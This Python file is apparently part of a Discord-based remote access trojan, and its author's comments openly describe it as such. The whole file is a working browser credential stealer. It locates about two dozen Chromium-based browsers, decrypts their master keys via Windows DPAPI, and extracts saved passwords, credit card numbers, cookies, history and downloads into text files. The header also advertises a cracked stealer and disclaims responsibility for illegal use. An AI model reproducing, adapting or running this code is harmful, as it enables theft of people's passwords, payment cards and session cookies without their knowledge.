import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData



# This RAT is made by H-zz-H!  
# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  

# Sources I skidded from:  
# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
# Tried doing it on my own (but I’m way too retarded for that).
# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
# Almost everything in this project is inspired by him.  

# Thanks for taking the time to read.  
# Love y’all. Bye.  
# ~~~ H-zz-H ~~~  

# This is the pass grab.py file. It is used to grab passwords from browsers.
# It grabs passwords from the browsers' databases and decrypts them.
# It also grabs cookies, history, credit cards, and downloads from the browsers.
# Not implemented in the RAT right now!!!!

localappdata = os.getenv('LOCALAPPDATA')
appdata = os.getenv('APPDATA')

browsers = {
    'avast': localappdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': localappdata + '\\Amigo\\User Data',
    'torch': localappdata + '\\Torch\\User Data',
    'kometa': localappdata + '\\Kometa\\User Data',
    'orbitum': localappdata + '\\Orbitum\\User Data',
    'cent-browser': localappdata + '\\CentBrowser\\User Data',
    '7star': localappdata + '\\7Star\\7Star\\User Data',
    'sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': localappdata + '\\Vivaldi\\User Data',
    'chromium': localappdata + '\\Chromium\\User Data',
    'chrome-canary': localappdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': localappdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': localappdata + '\\Epic Privacy Browser\\User Data',
    'msedge': localappdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': localappdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': localappdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': localappdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': localappdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': localappdata + '\\Iridium\\User Data',
    'coccoc': localappdata + '\\CocCoc\\Browser\\User Data',
    'opera': appdata + '\\Opera Software\\Opera Stable',
    'opera-gx': appdata + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16]

    try:
        decrypted_pass = decrypted_pass.decode('utf-8')
    except UnicodeDecodeError:
        try:
            decrypted_pass = decrypted_pass.decode('utf-16')
        except UnicodeDecodeError:
            decrypted_pass = str(decrypted_pass)
    
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content != "" and content != None:
        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
    else:
        print(f"\t [-] No Data Found!")


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except:
        print(f"Can't access file {type_of_data['file']}")
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result


def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    return available


if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            notdefault = ['opera-gx']
            profile = "Default"
            if browser in notdefault:
                profile = ""
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")
